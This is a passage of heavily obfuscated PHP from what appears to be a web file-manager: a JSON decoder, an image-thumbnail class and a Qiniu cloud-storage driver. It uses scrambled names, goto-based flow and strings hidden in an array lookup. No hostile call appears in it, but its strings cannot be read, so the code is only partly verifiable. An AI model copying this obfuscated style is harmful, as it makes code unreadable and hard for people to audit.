$fä®‡ùæ¼ .= substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 6); $E¨á¶·ªé× += 5; break; } } return $fä®‡ùæ¼; } elseif (preg_match($cïê«¨‹‰È[1918], $a°¬óÍ ßÔ) || preg_match($cïê«¨‹‰È[1919], $a°¬óÍ ßÔ)) { goto BÈŞïçŸ–; aœ‚æŒˆÂâ: for ($E¨á¶·ªé× = 0; $E¨á¶·ªé× <= $Fç§ëÓ®Ãµ; ++$E¨á¶·ªé×) { $cñÀ¶²õäï = end($fÃŸƒ²¥Æ«); $c™Ø¤°«Î£ = substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 2); if ($E¨á¶·ªé× == $Fç§ëÓ®Ãµ || $AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[47] && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] == SERVICES_JSON_SLICE) { $Bí¸ÛÂƒæ = substr($AŞ¨ñ°í­ˆ, $cñÀ¶²õäï[$cïê«¨‹‰È[268]], $E¨á¶·ªé× - $cñÀ¶²õäï[$cïê«¨‹‰È[268]]); array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_SLICE, $cïê«¨‹‰È[268] => $E¨á¶·ªé× + 1, $cïê«¨‹‰È[1921] => !1)); if (reset($fÃŸƒ²¥Æ«) == SERVICES_JSON_IN_ARR) { array_push($f¥îˆ‰¬Ş, $this->decode($Bí¸ÛÂƒæ)); } elseif (reset($fÃŸƒ²¥Æ«) == SERVICES_JSON_IN_OBJ) { $bÆ–Ü»ƒØ = array(); if (preg_match($cïê«¨‹‰È[1922], $Bí¸ÛÂƒæ, $bÆ–Ü»ƒØ)) { $C–¹àÓ½ò« = $this->decode($bÆ–Ü»ƒØ[1]); $AÂ²Ñ£ì = $this->decode($bÆ–Ü»ƒØ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c¥‹é¨®»[$C–¹àÓ½ò«] = $AÂ²Ñ£ì; } else { $c¥‹é¨®»->{$C–¹àÓ½ò«} = $AÂ²Ñ£ì; } } elseif (preg_match($cïê«¨‹‰È[1923], $Bí¸ÛÂƒæ, $bÆ–Ü»ƒØ)) { $C–¹àÓ½ò« = $bÆ–Ü»ƒØ[1]; $AÂ²Ñ£ì = $this->decode($bÆ–Ü»ƒØ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c¥‹é¨®»[$C–¹àÓ½ò«] = $AÂ²Ñ£ì; } else { $c¥‹é¨®»->{$C–¹àÓ½ò«} = $AÂ²Ñ£ì; } } } } elseif (($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[112] || $AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[55]) && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] != SERVICES_JSON_IN_STR) { array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_IN_STR, $cïê«¨‹‰È[268] => $E¨á¶·ªé×, $cïê«¨‹‰È[1921] => $AŞ¨ñ°í­ˆ[$E¨á¶·ªé×])); } elseif ($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cñÀ¶²õäï[$cïê«¨‹‰È[1921]] && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] == SERVICES_JSON_IN_STR && (strlen(substr($AŞ¨ñ°í­ˆ, 0, $E¨á¶·ªé×)) - strlen(rtrim(substr($AŞ¨ñ°í­ˆ, 0, $E¨á¶·ªé×), $cïê«¨‹‰È[93]))) % 2 != 1) { array_pop($fÃŸƒ²¥Æ«); } elseif ($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[153] && in_array($cñÀ¶²õäï[$cïê«¨‹‰È[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_IN_ARR, $cïê«¨‹‰È[268] => $E¨á¶·ªé×, $cïê«¨‹‰È[1921] => !1)); } elseif ($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[480] && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] == SERVICES_JSON_IN_ARR) { array_pop($fÃŸƒ²¥Æ«); } elseif ($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[1058] && in_array($cñÀ¶²õäï[$cïê«¨‹‰È[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_IN_OBJ, $cïê«¨‹‰È[268] => $E¨á¶·ªé×, $cïê«¨‹‰È[1921] => !1)); } elseif ($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×] == $cïê«¨‹‰È[320] && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] == SERVICES_JSON_IN_OBJ) { array_pop($fÃŸƒ²¥Æ«); } elseif ($c™Ø¤°«Î£ == $cïê«¨‹‰È[1924] && in_array($cñÀ¶²õäï[$cïê«¨‹‰È[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_IN_CMT, $cïê«¨‹‰È[268] => $E¨á¶·ªé×, $cïê«¨‹‰È[1921] => !1)); $E¨á¶·ªé×++; } elseif ($c™Ø¤°«Î£ == $cïê«¨‹‰È[1925] && $cñÀ¶²õäï[$cïê«¨‹‰È[1920]] == SERVICES_JSON_IN_CMT) { array_pop($fÃŸƒ²¥Æ«); $E¨á¶·ªé×++; for ($B‹é¬·ò‰ = $cñÀ¶²õäï[$cïê«¨‹‰È[268]]; $B‹é¬·ò‰ <= $E¨á¶·ªé×; ++$B‹é¬·ò‰) { $AŞ¨ñ°í­ˆ = substr_replace($AŞ¨ñ°í­ˆ, $cïê«¨‹‰È[50], $B‹é¬·ò‰, 1); } } } if (reset($fÃŸƒ²¥Æ«) == SERVICES_JSON_IN_ARR) { return $f¥îˆ‰¬Ş; } elseif (reset($fÃŸƒ²¥Æ«) == SERVICES_JSON_IN_OBJ) { return $c¥‹é¨®»; } goto dñß„‘˜Ä; dˆ…èô×‚‹: $AŞ¨ñ°í­ˆ = $this->reduce_string($AŞ¨ñ°í­ˆ); if ($AŞ¨ñ°í­ˆ == $cïê«¨‹‰È[33]) { if (reset($fÃŸƒ²¥Æ«) == SERVICES_JSON_IN_ARR) { return $f¥îˆ‰¬Ş; } else { return $c¥‹é¨®»; } } $Fç§ëÓ®Ãµ = strlen($AŞ¨ñ°í­ˆ); goto aœ‚æŒˆÂâ; BÈŞïçŸ–: if ($a°¬óÍ ßÔ[0] == $cïê«¨‹‰È[153]) { $fÃŸƒ²¥Æ« = array(SERVICES_JSON_IN_ARR); $f¥îˆ‰¬Ş = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $fÃŸƒ²¥Æ« = array(SERVICES_JSON_IN_OBJ); $c¥‹é¨®» = array(); } else { $fÃŸƒ²¥Æ« = array(SERVICES_JSON_IN_OBJ); $c¥‹é¨®» = new stdClass(); } } array_push($fÃŸƒ²¥Æ«, array($cïê«¨‹‰È[1920] => SERVICES_JSON_SLICE, $cïê«¨‹‰È[268] => 0, $cïê«¨‹‰È[1921] => !1)); $AŞ¨ñ°í­ˆ = substr($a°¬óÍ ßÔ, 1, -1); goto dˆ…èô×‚‹; dñß„‘˜Ä: } } } function isError($f¹”§øù†Ö, $DöÜ¬æŸŒ‹ = null) { $aÑ¤ĞÙ©Ü =& $_SERVER[ºÖÙÂŒäÉê‡]; if (class_exists($aÑ¤ĞÙ©Ü[1926])) { return PEAR::isError($f¹”§øù†Ö, $DöÜ¬æŸŒ‹); } elseif (is_object($f¹”§øù†Ö) && (get_class($f¹”§øù†Ö) == $aÑ¤ĞÙ©Ü[1927] || is_subclass_of($f¹”§øù†Ö, $aÑ¤ĞÙ©Ü[1927]))) { return !0; } return !1; } } if (class_exists($_SERVER[ºÖÙÂŒäÉê‡][1928])) { class Services_JSON_Error extends PEAR_Error { function __construct($aØ„òÌŠÂ  = "\165\156\153\x6e\157\167\x6e\x20\145\162\x72\x6f\x72", $bŠõ·®Ÿ‰ = null, $a°©ßÖ = null, $eó÷‘…èÔ‹ = null, $A‰«ë˜Á¶’ = null) { parent::PEAR_Error($aØ„òÌŠÂ , $bŠõ·®Ÿ‰, $a°©ßÖ, $eó÷‘…èÔ‹, $A‰«ë˜Á¶’); } } } else { class Services_JSON_Error { function __construct($dÁéÚ•š’ = "\165\x6e\153\x6e\157\x77\x6e\x20\x65\162\x72\157\x72", $C‰¨ªÓğ  = null, $c”½‹öÎé– = null, $Däôç’‘›Ğ = null, $E‡å«òóë­ = null) { } } } goto Aô‘…†Á…£; FêåÏõÏÜé: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($e¡­ÜÃ…ÍŸ, $EïÉÓÎÂ”Ã) { goto aö§Éäß¢‹; Dò¹ˆ •Õ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fËÏœñÇÛ¦; aö§Éäß¢‹: $this->srcFile = $e¡­ÜÃ…ÍŸ; $this->echoType = $EïÉÓÎÂ”Ã; $this->im = self::image($e¡­ÜÃ…ÍŸ); goto Aç˜¬ø‚; Aç˜¬ø‚: if (!$this->im) { return !1; } $eà¬õ ùÂÔ = $_SERVER[ºÖÙÂŒäÉê‡][33]; $this->imgData = GetImageSize($e¡­ÜÃ…ÍŸ, $eà¬õ ùÂÔ); goto Dò¹ˆ •Õ; fËÏœñÇÛ¦: } public static function image($a§Œ™é²¯è) { $Aƒ‰Æ¥¹„× =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÏ£âÍ±Ò¬ = $Aƒ‰Æ¥¹„×[33]; $B™´È‰©Ï¾ = GetImageSize($a§Œ™é²¯è, $DÏ£âÍ±Ò¬); $CÏî¼Á·ìÏ = !1; switch ($B™´È‰©Ï¾[2]) { case IMAGETYPE_GIF: if (!function_exists($Aƒ‰Æ¥¹„×[1826])) { break; } $CÏî¼Á·ìÏ = imagecreatefromgif($a§Œ™é²¯è); break; case IMAGETYPE_JPEG: if (!function_exists($Aƒ‰Æ¥¹„×[1827])) { break; } $CÏî¼Á·ìÏ = imagecreatefromjpeg($a§Œ™é²¯è); break; case IMAGETYPE_PNG: if (!function_exists($Aƒ‰Æ¥¹„×[1828])) { break; } $CÏî¼Á·ìÏ = @imagecreatefrompng($a§Œ™é²¯è); imagesavealpha($CÏî¼Á·ìÏ, !0); break; case IMAGETYPE_XBM: $CÏî¼Á·ìÏ = imagecreatefromxbm($a§Œ™é²¯è); break; case IMAGETYPE_WBMP: $CÏî¼Á·ìÏ = imagecreatefromwbmp($a§Œ™é²¯è); break; case IMAGETYPE_BMP: $CÏî¼Á·ìÏ = imagecreatefrombmp($a§Œ™é²¯è); break; default: break; } return $CÏî¼Á·ìÏ; } public static function imageSize($d—‚‡õÂâÆ) { $BÓä“¿¼Ì× =& $_SERVER[ºÖÙÂŒäÉê‡]; $f†ÊŠ‰²»ˆ = GetImageSize($d—‚‡õÂâÆ); if (!$f†ÊŠ‰²»ˆ) { return !1; } return array($BÓä“¿¼Ì×[1829] => $f†ÊŠ‰²»ˆ[0], $BÓä“¿¼Ì×[1830] => $f†ÊŠ‰²»ˆ[1]); } function distortion($A›“Ü‰¨Øç, $DºŠå˜—Ü, $E±ãò„­å¸) { $EŠ†Ñƒ¤í· = $this->creatImage($this->im, $DºŠå˜—Ü, $E±ãò„­å¸, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($EŠ†Ñƒ¤í·, $A›“Ü‰¨Øç); } function prorate($DŞå×Ñ†ƒ, $Dé¯Á‰…Úˆ, $E…µŠáì‡ß) { $e‹æŒÍ®Ú = $Dé¯Á‰…Úˆ / $E…µŠáì‡ß; $eìâÅŸÓ‚š = $this->srcW / $this->srcH; if ($e‹æŒÍ®Ú <= $eìâÅŸÓ‚š) { $B×Û¾ˆ”¸ó = $Dé¯Á‰…Úˆ; $EÀ¡õ¯ºÂ› = $B×Û¾ˆ”¸ó * ($this->srcH / $this->srcW); } else { $EÀ¡õ¯ºÂ› = $E…µŠáì‡ß; $B×Û¾ˆ”¸ó = $EÀ¡õ¯ºÂ› * ($this->srcW / $this->srcH); } if ($this->srcW > $Dé¯Á‰…Úˆ || $this->srcH > $E…µŠáì‡ß) { $F¯Ó³‚î¯É = $this->creatImage($this->im, $B×Û¾ˆ”¸ó, $EÀ¡õ¯ºÂ›, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F¯Ó³‚î¯É, $DŞå×Ñ†ƒ); } else { $F¯Ó³‚î¯É = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F¯Ó³‚î¯É, $DŞå×Ñ†ƒ); } } function cut($F™¹Ï…Œ…ø, $F£Êè‘¾ğ, $FÒ•ğƒˆ£¡) { goto eáŸäÊĞˆØ; CåÈ»¼ñç: $cù¬‡¬Áï = $this->creatImage($this->im, $aùŸ¼®‡“¢, $E‰ºçÏ´óÙ, 0, 0, 0, 0, $this->srcW, $this->srcH); $dÄ…–’ñâ¸ = $this->creatImage($cù¬‡¬Áï, $F£Êè‘¾ğ, $FÒ•ğƒˆ£¡, 0, 0, ($aùŸ¼®‡“¢ - $F£Êè‘¾ğ) / 2, ($E‰ºçÏ´óÙ - $FÒ•ğƒˆ£¡) / 2, $F£Êè‘¾ğ, $FÒ•ğƒˆ£¡); imageDestroy($cù¬‡¬Áï); goto FÚ½Â‘Ø‹Ö; eáŸäÊĞˆØ: $BÛ”«Ü¹œé = $F£Êè‘¾ğ / $FÒ•ğƒˆ£¡; $aƒÙ…½¢ù’ = $this->srcW / $this->srcH; if ($BÛ”«Ü¹œé <= $aƒÙ…½¢ù’) { $E‰ºçÏ´óÙ = $FÒ•ğƒˆ£¡; $aùŸ¼®‡“¢ = $E‰ºçÏ´óÙ * ($this->srcW / $this->srcH); } else { $aùŸ¼®‡“¢ = $F£Êè‘¾ğ; $E‰ºçÏ´óÙ = $aùŸ¼®‡“¢ * ($this->srcH / $this->srcW); } goto CåÈ»¼ñç; FÚ½Â‘Ø‹Ö: return $this->echoImage($dÄ…–’ñâ¸, $F™¹Ï…Œ…ø); goto DÀŠËÂÎŠ®; DÀŠËÂÎŠ®: } function backFill($f¿ÁÒšÕˆ, $f›ö©ä¯, $F„Ì™›ä°”, $A½ÏÕÜ·Öò = false, $càì¶¶¾ğ­ = 255, $B‡âÛ÷ã©» = 255, $c‰¬¹Ù¦˜ = 255) { goto A°ÕùÍø‡—; C‚„Ş¸§Õ: if (function_exists($_SERVER[ºÖÙÂŒäÉê‡][1831])) { @($f»èõŞ® = imageCreateTrueColor($f›ö©ä¯, $F„Ì™›ä°”)); if (!$f»èõŞ®) { $f»èõŞ® = imageCreate($f›ö©ä¯, $F„Ì™›ä°”); } } else { $f»èõŞ® = imageCreate($f›ö©ä¯, $F„Ì™›ä°”); } $D¿Ù—óø¼© = ($F„Ì™›ä°” - $Cö¡Æã·Ì¶) / 2; $D››ÃÅŒ = imagecolorallocate($f»èõŞ®, $càì¶¶¾ğ­, $B‡âÛ÷ã©», $c‰¬¹Ù¦˜); goto C—œƒ»Á–; A°ÕùÍø‡—: $FØ—ğÚ±˜ = $f›ö©ä¯ / $F„Ì™›ä°”; $bŒËšŠâª† = $this->srcW / $this->srcH; if ($FØ—ğÚ±˜ <= $bŒËšŠâª†) { $D„‰³Ö¯“õ = $f›ö©ä¯; $Cö¡Æã·Ì¶ = $D„‰³Ö¯“õ * ($this->srcH / $this->srcW); } else { $Cö¡Æã·Ì¶ = $F„Ì™›ä°”; $D„‰³Ö¯“õ = $Cö¡Æã·Ì¶ * ($this->srcW / $this->srcH); } goto C‚„Ş¸§Õ; BÎ¬ìñ‹†­: return $this->echoImage($f»èõŞ®, $f¿ÁÒšÕˆ); goto f ÅäÛÜ; C—œƒ»Á–: if ($A½ÏÕÜ·Öò) { $D››ÃÅŒ = imageColorTransparent($f»èõŞ®, $D››ÃÅŒ); $D¿Ù—óø¼© = $F„Ì™›ä°” - $Cö¡Æã·Ì¶; } imageFilledRectangle($f»èõŞ®, 0, 0, $f›ö©ä¯, $F„Ì™›ä°”, $D››ÃÅŒ); if ($this->srcW > $f›ö©ä¯ || $this->srcH > $F„Ì™›ä°”) { $a·ØñéÜ…Î = $this->creatImage($this->im, $D„‰³Ö¯“õ, $Cö¡Æã·Ì¶, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($D„‰³Ö¯“õ < $f›ö©ä¯) { imageCopy($f»èõŞ®, $a·ØñéÜ…Î, ($f›ö©ä¯ - $D„‰³Ö¯“õ) / 2, 0, 0, 0, $D„‰³Ö¯“õ, $Cö¡Æã·Ì¶); } else { if ($Cö¡Æã·Ì¶ < $F„Ì™›ä°”) { imageCopy($f»èõŞ®, $a·ØñéÜ…Î, 0, $D¿Ù—óø¼©, 0, 0, $D„‰³Ö¯“õ, $Cö¡Æã·Ì¶); } else { imageCopy($f»èõŞ®, $a·ØñéÜ…Î, 0, 0, 0, 0, $D„‰³Ö¯“õ, $Cö¡Æã·Ì¶); } } } else { imageCopyMerge($f»èõŞ®, $this->im, ($f›ö©ä¯ - $D„‰³Ö¯“õ) / 2, $D¿Ù—óø¼©, 0, 0, $D„‰³Ö¯“õ, $Cö¡Æã·Ì¶, 100); } goto BÎ¬ìñ‹†­; f ÅäÛÜ: } function creatImage($e“´¢ìÏË‡, $bÒöÀéæ°Ï, $AæËè‹ùèÁ, $C¼ŞÚÑˆ›ª, $A‰Ğ´—Ç²æ, $fƒçÌâœ†Ï, $FÉô¶«ËÀ‰, $A¢Ç’ÃÛ¯, $bãæÙ¹×í—) { if (function_exists($_SERVER[ºÖÙÂŒäÉê‡][1831])) { @($EÜÀ••»ù„ = ImageCreateTrueColor($bÒöÀéæ°Ï, $AæËè‹ùèÁ)); @imagealphablending($EÜÀ••»ù„, !1); @imagesavealpha($EÜÀ••»ù„, !0); if ($EÜÀ••»ù„) { imageCopyResampled($EÜÀ••»ù„, $e“´¢ìÏË‡, $C¼ŞÚÑˆ›ª, $A‰Ğ´—Ç²æ, $fƒçÌâœ†Ï, $FÉô¶«ËÀ‰, $bÒöÀéæ°Ï, $AæËè‹ùèÁ, $A¢Ç’ÃÛ¯, $bãæÙ¹×í—); } else { $EÜÀ••»ù„ = ImageCreate($bÒöÀéæ°Ï, $AæËè‹ùèÁ); imageCopyResized($EÜÀ••»ù„, $e“´¢ìÏË‡, $C¼ŞÚÑˆ›ª, $A‰Ğ´—Ç²æ, $fƒçÌâœ†Ï, $FÉô¶«ËÀ‰, $bÒöÀéæ°Ï, $AæËè‹ùèÁ, $A¢Ç’ÃÛ¯, $bãæÙ¹×í—); } } else { $EÜÀ••»ù„ = ImageCreate($bÒöÀéæ°Ï, $AæËè‹ùèÁ); imageCopyResized($EÜÀ••»ù„, $e“´¢ìÏË‡, $C¼ŞÚÑˆ›ª, $A‰Ğ´—Ç²æ, $fƒçÌâœ†Ï, $FÉô¶«ËÀ‰, $bÒöÀéæ°Ï, $AæËè‹ùèÁ, $A¢Ç’ÃÛ¯, $bãæÙ¹×í—); } return $EÜÀ••»ù„; } public function imgRotate($f·¢šØÅ®, $e§¶ÜÅ¯è´) { goto cŒ½¶åŒºã; cŒ½¶åŒºã: if (!$this->im || $e§¶ÜÅ¯è´ % 360 === 0 || !function_exists($_SERVER[ºÖÙÂŒäÉê‡][1832])) { return !1; } $c†¹¯‹Ú‘Ù = imageRotate($this->im, 360 - $e§¶ÜÅ¯è´, 0); $EõŞë³ = !1; goto DœÕ’×‡æ; dËŞ¸Œ¨±: return $EõŞë³; goto C›ªÏô´; DœÕ’×‡æ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $EõŞë³ = imagegif($c†¹¯‹Ú‘Ù, $f·¢šØÅ®); break; case IMAGETYPE_JPEG: $EõŞë³ = imagejpeg($c†¹¯‹Ú‘Ù, $f·¢šØÅ®, 100); break; case IMAGETYPE_PNG: $EõŞë³ = imagePNG($c†¹¯‹Ú‘Ù, $f·¢šØÅ®); break; default: break; } imageDestroy($c†¹¯‹Ú‘Ù); imageDestroy($this->im); goto dËŞ¸Œ¨±; C›ªÏô´: } function echoImage($E“Ê›Ş¨æ, $E˜³˜Ñè‚Ñ) { goto CÅ¹²ÑìÆ; A”¡â°¹”×: $Eá ÙÆ½áß = !1; switch ($this->echoType) { case $Eø’Ë‹÷[1833]: $Eá ÙÆ½áß = imagePNG($E“Ê›Ş¨æ); break; case $Eø’Ë‹÷[163]: $Eá ÙÆ½áß = imagePNG($E“Ê›Ş¨æ, $E˜³˜Ñè‚Ñ); break; } imageDestroy($E“Ê›Ş¨æ); goto có‰“ôˆâ; có‰“ôˆâ: imageDestroy($this->im); return $Eá ÙÆ½áß; goto Fó†´Ş¹à; CÅ¹²ÑìÆ: $Eø’Ë‹÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$E“Ê›Ş¨æ) { return !1; } ob_get_clean(); goto A”¡â°¹”×; Fó†´Ş¹à: } } if (!function_exists($_SERVER[ºÖÙÂŒäÉê‡][1834])) { define($_SERVER[ºÖÙÂŒäÉê‡][1835], 0); define($_SERVER[ºÖÙÂŒäÉê‡][1836], 1); define($_SERVER[ºÖÙÂŒäÉê‡][1837], 2); function imageflip($D°ÅÕ›ç«‚, $Då¿ù×›Ëñ) { switch ($Då¿ù×›Ëñ) { case IMG_FLIP_HORIZONTAL: $dõ…ä˜§âß = imagesx($D°ÅÕ›ç«‚) - 1; $BóÇï’× = $dõ…ä˜§âß / 2; $EÉİŠ†ÏßÛ = imagesy($D°ÅÕ›ç«‚); $B¨§±óÈÀÔ = imageistruecolor($D°ÅÕ›ç«‚) ? imagecreatetruecolor(1, $EÉİŠ†ÏßÛ) : imagecreate(1, $EÉİŠ†ÏßÛ); for ($Fˆìœ–°òˆ = 0; $Fˆìœ–°òˆ < $BóÇï’×; ++$Fˆìœ–°òˆ) { imagecopy($B¨§±óÈÀÔ, $D°ÅÕ›ç«‚, 0, 0, $Fˆìœ–°òˆ, 0, 1, $EÉİŠ†ÏßÛ); imagecopy($D°ÅÕ›ç«‚, $D°ÅÕ›ç«‚, $Fˆìœ–°òˆ, 0, $dõ…ä˜§âß - $Fˆìœ–°òˆ, 0, 1, $EÉİŠ†ÏßÛ); imagecopy($D°ÅÕ›ç«‚, $B¨§±óÈÀÔ, $dõ…ä˜§âß - $Fˆìœ–°òˆ, 0, 0, 0, 1, $EÉİŠ†ÏßÛ); } break; case IMG_FLIP_VERTICAL: $bäÍîéäìŞ = imagesx($D°ÅÕ›ç«‚); $c¤Í¨ƒ­Ş = imagesy($D°ÅÕ›ç«‚) - 1; $AØªëÜÊä = $c¤Í¨ƒ­Ş / 2; $B¨§±óÈÀÔ = imageistruecolor($D°ÅÕ›ç«‚) ? imagecreatetruecolor($bäÍîéäìŞ, 1) : imagecreate($bäÍîéäìŞ, 1); for ($CÆÕ…¶ƒí° = 0; $CÆÕ…¶ƒí° < $AØªëÜÊä; ++$CÆÕ…¶ƒí°) { imagecopy($B¨§±óÈÀÔ, $D°ÅÕ›ç«‚, 0, 0, 0, $CÆÕ…¶ƒí°, $bäÍîéäìŞ, 1); imagecopy($D°ÅÕ›ç«‚, $D°ÅÕ›ç«‚, 0, $CÆÕ…¶ƒí°, 0, $c¤Í¨ƒ­Ş - $CÆÕ…¶ƒí°, $bäÍîéäìŞ, 1); imagecopy($D°ÅÕ›ç«‚, $B¨§±óÈÀÔ, 0, $c¤Í¨ƒ­Ş - $CÆÕ…¶ƒí°, 0, 0, $bäÍîéäìŞ, 1); } break; case IMG_FLIP_BOTH: $bäÍîéäìŞ = imagesx($D°ÅÕ›ç«‚); $EÉİŠ†ÏßÛ = imagesy($D°ÅÕ›ç«‚); $B¨§±óÈÀÔ = imagerotate($D°ÅÕ›ç«‚, 180, 0); imagecopy($D°ÅÕ›ç«‚, $B¨§±óÈÀÔ, 0, 0, 0, 0, $bäÍîéäìŞ, $EÉİŠ†ÏßÛ); break; default: return; } imagedestroy($B¨§±óÈÀÔ); } } if (!function_exists($_SERVER[ºÖÙÂŒäÉê‡][1838])) { function imagecreatefrombmp($eÊ‰èÓÛ˜) { return ImageGdBMP::load($eÊ‰èÓÛ˜); } } goto f½¹ÑõƒÂÚ; CÅËæ­ô: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($b—çƒ‹”Õµ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ºÖÙÂŒäÉê‡][1194]; $this->_init($b—çƒ‹”Õµ); } public function _init($DÙË¨ïÀÁ¿) { foreach ($DÙË¨ïÀÁ¿ as $dÊƒ‚‹ÏäÒ => $Fƒµê›•Š) { if (isset($this->{$dÊƒ‚‹ÏäÒ})) { $this->{$dÊƒ‚‹ÏäÒ} = $Fƒµê›•Š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ºÖÙÂŒäÉê‡][1195], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($dˆšöô“Û, $e‡÷åğìÔ = '', $Bà‰ĞÜ¡Åâ = REPEAT_RENAME) { if ($this->setContent($dˆšöô“Û, $e‡÷åğìÔ)) { return $this->getPathOuter($dˆšöô“Û); } return !1; } public function mkdir($dÎ¯‹—Ó¢Š, $aí”¡åÂŸ• = REPEAT_SKIP) { goto e¢‡„è¯¼¼; c‰ùåã†œæ: if (!$this->mkfile($C°©ˆÕÍË)) { return !1; } if (!$this->moveFile($C°©ˆÕÍË, $dÎ¯‹—Ó¢Š)) { $this->delFile($C°©ˆÕÍË); return !1; } return $this->getPathOuter($D…ì¿Âô·½); goto aŠÑİ§ê •; e¢‡„è¯¼¼: $AˆÇŒãæ†ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $D…ì¿Âô·½ = trim($dÎ¯‹—Ó¢Š, $AˆÇŒãæ†ë[8]); if ($this->_isFolder($D…ì¿Âô·½)) { return $this->getPathOuter($D…ì¿Âô·½); } goto FùÇõ’›Éğ; FùÇõ’›Éğ: $dÎ¯‹—Ó¢Š = $D…ì¿Âô·½ . $AˆÇŒãæ†ë[8]; $CîÕ¬Äëí = get_path_this($D…ì¿Âô·½); $C°©ˆÕÍË = $dÎ¯‹—Ó¢Š . $CîÕ¬Äëí; goto c‰ùåã†œæ; aŠÑİ§ê •: } public function copyFile($eõåªÌ†, $bù§­²ˆà) { $eé¹Ãø™ÛÜ = $this->bucketManager->copy($this->bucket, $eõåªÌ†, $this->bucket, $bù§­²ˆà, !0); return $eé¹Ãø™ÛÜ ? !1 : !0; } public function moveFile($C‹‹‚´—ãõ, $D”İ°Ó¹Êò) { $b˜›”ƒ®‚ = $this->bucketManager->move($this->bucket, $C‹‹‚´—ãõ, $this->bucket, $D”İ°Ó¹Êò, !0); return $b˜›”ƒ®‚ ? !1 : !0; } public function delFile($E£…ÕÚŒ…ä) { $e‹ÃÆî = $this->bucketManager->delete($this->bucket, $E£…ÕÚŒ…ä); return $e‹ÃÆî ? !1 : !0; } public function delFolder($BŞˆí‘Èí¨) { $EôÀñ¸ â = $this->fileList($BŞˆí‘Èí¨); if (empty($EôÀñ¸ â)) { return !0; } $BÀ½Ûèé = 1000; if (count($EôÀñ¸ â) <= $BÀ½Ûèé) { return $this->qnDelObj($EôÀñ¸ â) ? !1 : !0; } foreach (array_chunk($EôÀñ¸ â, $BÀ½Ûèé) as $böŸëÙ§Ì´) { $bñÆ°ŠáÕÍ = $this->qnDelObj($böŸëÙ§Ì´); if ($bñÆ°ŠáÕÍ) { return !1; } } return !0; } private function qnDelObj($cŠ­‡Òµ) { $cÇ­µ¸‹½Ü = $this->bucketManager->buildBatchDelete($this->bucket, $cŠ­‡Òµ); list($cÕ³Ü’½¾ò, $D¦Û…ÖõÃ¹) = $this->bucketManager->batch($cÇ­µ¸‹½Ü); return $D¦Û…ÖõÃ¹; } private function fileList($dØÉ‘¾É, $BÆ¹¿ñÚ±é = 0) { goto E­ŠÂÊ­; E­ŠÂÊ­: $c •Öæ¨’Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $dØÉ‘¾É = trim($dØÉ‘¾É, $c •Öæ¨’Î[8]); $AŒ±ôğÖ¨¥ = empty($dØÉ‘¾É) ? $c •Öæ¨’Î[33] : $dØÉ‘¾É . $c •Öæ¨’Î[8]; goto DÍñŠé“‹¹; eØˆ¨Ñ¿·ª: $E‹Ôˆ¤Ôê = array(); while (!0) { list($eÁ±ø˜…ÚÃ, $e¹†‹œ‘Ÿ) = $this->bucketManager->listFiles($this->bucket, $AŒ±ôğÖ¨¥, $A”Ä¥¿–Ì, $bßéõ„Äæ×, $F½Ğè­Î×Â); if ($e¹†‹œ‘Ÿ) { return !1; } $A”Ä¥¿–Ì = array_key_exists($c 